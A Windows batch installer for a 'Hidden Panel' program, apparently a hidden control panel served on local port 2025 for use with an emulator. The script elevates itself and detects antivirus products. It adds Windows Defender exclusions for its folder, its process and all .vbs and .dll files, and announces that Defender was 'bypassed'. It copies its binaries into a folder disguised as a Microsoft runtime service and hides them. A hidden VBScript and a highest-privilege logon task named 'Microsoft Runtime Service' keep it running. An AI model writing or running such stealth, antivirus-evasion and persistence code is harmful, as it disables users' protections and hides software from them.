@echo off
setlocal enabledelayedexpansion
title Hidden Panel Installer
color 0B
cls

echo ========================================
echo   Hidden Panel - Installer
echo ========================================
echo.
echo Setting up Hidden Panel in this Pc
echo.
echo Press any key to continue or Ctrl+C to cancel...
pause >nul
cls

REM Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo [WARNING] Administrator privileges required!
    echo.
    echo Requesting administrator access...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

cls
echo ========================================
echo   Hidden Panel - Installer
echo ========================================
echo.
echo Setting up Hidden Panel in this Pc
echo.
timeout /t 1 >nul

REM Get script directory
set "INSTALL_DIR=%~dp0"
set "DLL_NAME=RuntimeService.dll"

echo Installing 10%...
REM Detect other Antivirus software
set "AV_FOUND=None"
tasklist /FI "IMAGENAME eq avastsvc.exe" 2>NUL | find /I /N "avastsvc.exe">NUL
if "%ERRORLEVEL%"=="0" set "AV_FOUND=Avast"
tasklist /FI "IMAGENAME eq NS.exe" 2>NUL | find /I /N "NS.exe">NUL
if "%ERRORLEVEL%"=="0" set "AV_FOUND=Norton"
tasklist /FI "IMAGENAME eq avp.exe" 2>NUL | find /I /N "avp.exe">NUL
if "%ERRORLEVEL%"=="0" set "AV_FOUND=Kaspersky"
tasklist /FI "IMAGENAME eq mcshield.exe" 2>NUL | find /I /N "mcshield.exe">NUL
if "%ERRORLEVEL%"=="0" set "AV_FOUND=McAfee"
tasklist /FI "IMAGENAME eq mbam.exe" 2>NUL | find /I /N "mbam.exe">NUL
if "%ERRORLEVEL%"=="0" set "AV_FOUND=Malwarebytes"

if not "%AV_FOUND%"=="None" (
    echo [WARNING] Detected %AV_FOUND% Antivirus!
    echo Please make sure to add the installation folder to your %AV_FOUND% exclusions
    echo manually if the installer is blocked.
    timeout /t 3 >nul
)

REM Add Windows Defender Exclusions
set "TARGET_DIR=%LOCALAPPDATA%\Microsoft\RuntimeService"
echo Adding Windows Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'WinRTSvcHost.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.vbs', '.dll'" >nul 2>&1

echo Windows defender bypassed successfully
timeout /t 1 >nul

REM Find DLL
set "DLL_PATH="
if exist "%INSTALL_DIR%%DLL_NAME%" (
    set "DLL_PATH=%INSTALL_DIR%%DLL_NAME%"
) else if exist "%INSTALL_DIR%..\x64\Release\%DLL_NAME%" (
    set "DLL_PATH=%INSTALL_DIR%..\x64\Release\%DLL_NAME%"
) else if exist "%INSTALL_DIR%..\..\x64\Release\%DLL_NAME%" (
    set "DLL_PATH=%INSTALL_DIR%..\..\x64\Release\%DLL_NAME%"
) else (
    echo [ERROR] DLL not found!
    echo Please make sure %DLL_NAME% is in the same folder or x64\Release folder.
    pause
    exit /b 1
)

echo Installing 20%...
timeout /t 1 >nul

REM Create installation directory
set "APP_DATA_DIR=%LOCALAPPDATA%\Microsoft\RuntimeService"
if not exist "%LOCALAPPDATA%\Microsoft" (
    mkdir "%LOCALAPPDATA%\Microsoft" >nul 2>&1
)
if not exist "%APP_DATA_DIR%" (
    mkdir "%APP_DATA_DIR%" >nul 2>&1
)

echo Installing 30%...
timeout /t 1 >nul

REM Copy DLL to installation directory
copy /Y "%DLL_PATH%" "%APP_DATA_DIR%\%DLL_NAME%" >nul
if %errorLevel% neq 0 (
    echo [ERROR] Failed to copy DLL!
    pause
    exit /b 1
)

echo Installing 40%...
timeout /t 1 >nul

REM Check if WinRTSvcHost.exe exists
if not exist "%INSTALL_DIR%WinRTSvcHost.exe" (
    echo [ERROR] WinRTSvcHost.exe not found!
    echo Please build the project first.
    pause
    exit /b 1
)

REM Copy WinRTSvcHost.exe to installation directory
copy /Y "%INSTALL_DIR%WinRTSvcHost.exe" "%APP_DATA_DIR%\WinRTSvcHost.exe" >nul

echo Installing 50%...
timeout /t 1 >nul

REM Create RunAsAdmin.vbs
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
    echo.
    echo ' Try installation directory first
    echo strInstallDir = WshShell.ExpandEnvironmentStrings^("%%LOCALAPPDATA%%"^) ^& "\Microsoft\RuntimeService"
    echo strExePath = strInstallDir ^& "\WinRTSvcHost.exe"
    echo.
    echo ' If not in install dir, try script directory
    echo If Not fso.FileExists^(strExePath^) Then
    echo     strScriptPath = fso.GetParentFolderName^(WScript.ScriptFullName^)
    echo     strExePath = strScriptPath ^& "\WinRTSvcHost.exe"
    echo End If
    echo.
    echo ' Check if WinRTSvcHost.exe exists
    echo If Not fso.FileExists^(strExePath^) Then
    echo     ' Silent fail - don't show error on startup
    echo     WScript.Quit
    echo End If
    echo.
    echo ' Run Runtime Service silently ^(hidden window^)
    echo ' Task Scheduler already runs this with admin privileges, so no elevation needed
    echo WshShell.Run """" ^& strExePath ^& """", 0, False
) > "%APP_DATA_DIR%\RunAsAdmin.vbs"

REM Set installation directory to hidden for extra stealth
attrib +h "%APP_DATA_DIR%" >nul 2>&1
attrib +h "%APP_DATA_DIR%\%DLL_NAME%" >nul 2>&1
attrib +h "%APP_DATA_DIR%\WinRTSvcHost.exe" >nul 2>&1
attrib +h "%APP_DATA_DIR%\RunAsAdmin.vbs" >nul 2>&1

REM Verify file integrity (check if AV deleted them already)
if not exist "%APP_DATA_DIR%\WinRTSvcHost.exe" (
    echo [ERROR] Installation failed - Executable was removed by Antivirus!
    echo Please disable your Antivirus or add an exclusion for:
    echo %APP_DATA_DIR%
    pause
    exit /b 1
)

echo Installing 60%...
timeout /t 1 >nul

REM Remove old startup shortcut if exists (cleanup)
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%STARTUP_FOLDER%\Microsoft Runtime Service.lnk" (
    del "%STARTUP_FOLDER%\Microsoft Runtime Service.lnk" >nul 2>&1
)
if exist "%STARTUP_FOLDER%\WinRTSvcHost.lnk" (
    del "%STARTUP_FOLDER%\WinRTSvcHost.lnk" >nul 2>&1
)

echo Installing 70%...
timeout /t 1 >nul

REM Remove old scheduled task if exists (cleanup)
schtasks /Query /TN "Microsoft Runtime Service" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    schtasks /Delete /TN "Microsoft Runtime Service" /F >nul 2>&1
)

echo Installing 80%...
timeout /t 1 >nul

REM Create scheduled task to run silently as admin on startup
set "VBS_PATH=%APP_DATA_DIR%\RunAsAdmin.vbs"
set "TASK_NAME=Microsoft Runtime Service"
set "TASK_CREATED=0"

REM Create scheduled task using schtasks command
REM This task will run at logon with highest privileges (admin) without UAC prompt
schtasks /Create /TN "%TASK_NAME%" /TR "wscript.exe /B \"%VBS_PATH%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
if %ERRORLEVEL% equ 0 (
    REM Verify task was created
    schtasks /Query /TN "%TASK_NAME%" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        set "TASK_CREATED=1"
    )
)

REM Fallback: Use PowerShell to create task if schtasks failed
if %TASK_CREATED% equ 0 (
    set "PS_SCRIPT=%TEMP%\create_task_%RANDOM%.ps1"
    (
        echo $vbsPath = "%VBS_PATH%"
        echo $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "/B `"$vbsPath`""
        echo $Trigger = New-ScheduledTaskTrigger -AtLogOn
        echo $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -RunLevel Highest -LogonType Interactive
        echo $Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        echo Register-ScheduledTask -TaskName "Microsoft Runtime Service" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force ^| Out-Null
        echo if ^(Get-ScheduledTask -TaskName "Microsoft Runtime Service" -ErrorAction SilentlyContinue^) { exit 0 } else { exit 1 }
    ) > "%PS_SCRIPT%"
    
    powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_SCRIPT%" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        set "TASK_CREATED=1"
    )
    del "%PS_SCRIPT%" >nul 2>&1
)

echo Installing 90%...
timeout /t 1 >nul

REM Final verification
if %TASK_CREATED% equ 0 (
    echo.
    echo [ERROR] Failed to create scheduled task!
    echo.
    echo Please create it manually using Task Scheduler:
    echo 1. Open Task Scheduler
    echo 2. Create Basic Task
    echo 3. Trigger: When I log on
    echo 4. Action: Start a program
    echo 5. Program: wscript.exe
    echo 6. Arguments: /B "%VBS_PATH%"
    echo 7. Check "Run with highest privileges"
    echo.
    pause
    exit /b 1
)

echo Installing 100%...
timeout /t 1 >nul

REM Get local IP address (skip the [INFO] message to keep output clean)
set "LOCAL_IP=127.0.0.1"
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set "IP_TEMP=%%a"
    set "IP_TEMP=!IP_TEMP: =!"
    REM Skip loopback and take first non-127.0.0.1 IP
    if not "!IP_TEMP!"=="127.0.0.1" (
        if not "!IP_TEMP!"=="" (
            set "LOCAL_IP=!IP_TEMP!"
            goto :ip_found
        )
    )
)
:ip_found
REM Try PowerShell method as fallback for better accuracy
if "!LOCAL_IP!"=="127.0.0.1" (
    for /f "delims=" %%i in ('powershell -NoProfile -Command "try { (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -ne '127.0.0.1' -and $_.PrefixOrigin -eq 'Dhcp' } | Select-Object -First 1 -ExpandProperty IPAddress) } catch { '127.0.0.1' }" 2^>nul') do (
        if not "%%i"=="" set "LOCAL_IP=%%i"
    )
)

REM Success message
cls
echo ========================================
echo   Hidden Panel - Installer
echo ========================================
echo.
echo Successfully installed Hidden Panel in this setup
echo.
echo ========================================
echo   ACCESS CONTROL PANEL
echo ========================================
echo.
echo Run your emulator and go to:
echo.
echo   http://!LOCAL_IP!:2025
echo.
echo ========================================
echo.

pause
